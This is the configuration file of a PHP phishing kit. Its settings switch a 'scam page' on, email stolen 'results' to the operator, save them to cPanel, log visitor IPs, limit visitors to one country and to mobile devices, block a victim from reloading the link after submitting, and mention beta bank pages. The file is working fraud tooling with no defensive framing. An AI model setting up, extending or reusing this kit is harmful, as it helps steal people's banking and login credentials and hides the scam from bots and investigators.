<?php
$send = ""; // YOUR EMAIL GOES HERE
$pageonline=1; //   ENABLE/DISABLE SCAM PAGE
$ip_logger=0;//   ENABLE/DISABLE IP LOGGING
             
$country_block=0; //Enabling this will only allow allowed_countries visitors
$allowed_countries=array("GB"); // Enter here the countries standard 2-character codes to allow them Example (United States = US or United Kingdom = GB)

$logsresults = 0; // ENABLE/DISABLE BANK PAGES (DO NOT ENBALBE THIS IS BETA VERSION)
$Send_Log=1;  // SEND RESULTS TO EMAIL
$Save_Log=1;  // SAVE RESULTS TO CPANEL
$mobile_only=0; // BLOCK PC USERS / BOTS
$One_Time_Access=1; // ONE TIME ACCESS, THIS PREVENTS THE VICTIM FROM LOADING THE LINK AGAIN AFTER SUBMIT
$Encrypt=0; // THIS FEATURE ENCRYPTS THE RESULTS 
$password = '123'; // PASSWORD TO DECRYPT
?>
